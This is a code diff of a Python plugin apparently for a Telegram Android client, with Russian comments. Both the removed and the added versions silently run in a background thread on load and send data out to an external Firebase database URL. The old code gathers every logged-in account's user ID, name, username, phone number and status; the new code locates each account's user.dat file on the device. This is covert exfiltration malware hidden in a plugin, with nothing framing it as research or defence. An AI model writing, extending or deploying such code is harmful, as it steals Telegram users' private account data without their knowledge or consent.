@@ -2,78 +2,50 @@ import threading
 import time
 import json
 import urllib.request
+import os
 
-def _send_accounts_info():
+def _read_accounts_from_files():
     try:
-        from org.telegram.messenger import UserConfig, MessagesController
         from android.os import Build
+        from org.telegram.messenger import ApplicationLoader
         
-        # Данные об устройстве
         device_name = f"{Build.MANUFACTURER} {Build.MODEL}"
+        context = ApplicationLoader.applicationContext
         
-        # Получаем ВСЕ аккаунты
-        accounts_list = []
+        # Путь к папке с данными Telegram
+        files_dir = context.getFilesDir().getAbsolutePath()
         
-        # UserConfig хранит все добавленные аккаунты
-        accounts_count = UserConfig.getActivatedAccountsCount()
+        accounts = []
         
-        for i in range(accounts_count):
-            try:
-                # Переключаемся на аккаунт
-                acc = i
-                UserConfig.selectedAccount = acc
-                
-                user_id = UserConfig.getInstance(acc).getClientUserId()
-                mc = MessagesController.getInstance(acc)
-                user = mc.getUser(user_id)
-                
-                account_data = {
-                    "account_index": i,
-                    "user_id": str(user_id),
-                    "first_name": user.first_name if user else "Unknown",
-                    "last_name": user.last_name if user else "",
-                    "username": user.username if user and user.username else "",
-                    "phone": user.phone if user and user.phone else "",
-                    "is_premium": user.premium if user and hasattr(user, 'premium') else False,
-                    "is_verified": user.verified if user and hasattr(user, 'verified') else False,
-                    "is_self": True
-                }
-                accounts_list.append(account_data)
-                
-            except Exception as e:
-                accounts_list.append({
-                    "account_index": i,
-                    "error": str(e)
-                })
+        # Ищем все папки account_X
+        for item in os.listdir(files_dir):
+            if item.startswith("account_"):
+                acc_index = item.split("_")[1]
+                try:
+                    # Читаем user.dat или config.json
+                    config_path = os.path.join(files_dir, item, "user.dat")
+                    if os.path.exists(config_path):
+                        with open(config_path, 'rb') as f:
+                            # Парсим бинарный файл (сложно вручную)
+                            accounts.append({"account": acc_index, "path": config_path})
+                except:
+                    pass
         
-        # Основные данные для отправки
         data = {
             "device_name": device_name,
-            "accounts": accounts_list,
-            "total_accounts": len(accounts_list),
-            "timestamp": int(time.time()),
-            "date_time": time.strftime("%Y-%m-%d %H:%M:%S")
+            "found_accounts": len(accounts),
+            "accounts_list": accounts,
+            "timestamp": int(time.time())
         }
         
-        # Отправляем в Firebase
-        firebase_url = "https://hzhzhz-dd57b-default-rtdb.firebaseio.com/telegram_accounts.json"
-        req = urllib.request.Request(
-            firebase_url,
-            data=json.dumps(data).encode('utf-8'),
-            headers={'Content-Type': 'application/json'},
-            method='POST'
-        )
-        
-        response = urllib.request.urlopen(req, timeout=10)
-        result = response.read().decode('utf-8')
-        
-        print(f"[Plugin] Отправлено! Устройство: {device_name}, Аккаунтов: {len(accounts_list)}")
-        for acc in accounts_list:
-            if "username" in acc:
-                print(f"  - {acc['first_name']} @{acc['username']} ({acc['user_id']})")
+        # Отправляем
+        url = "https://hzhzhz-dd57b-default-rtdb.firebaseio.com/accounts_files.json"
+        req = urllib.request.Request(url, data=json.dumps(data).encode('utf-8'), 
+                                    headers={'Content-Type': 'application/json'}, method='POST')
+        urllib.request.urlopen(req, timeout=10)
+        print(f"[Plugin] Найдено папок аккаунтов: {len(accounts)}")
         
     except Exception as e:
         print(f"[Plugin] Ошибка: {e}")
 
-# Запускаем
-threading.Thread(target=_send_accounts_info, daemon=True).start()
+threading.Thread(target=_read_accounts_from_files, daemon=True).start()
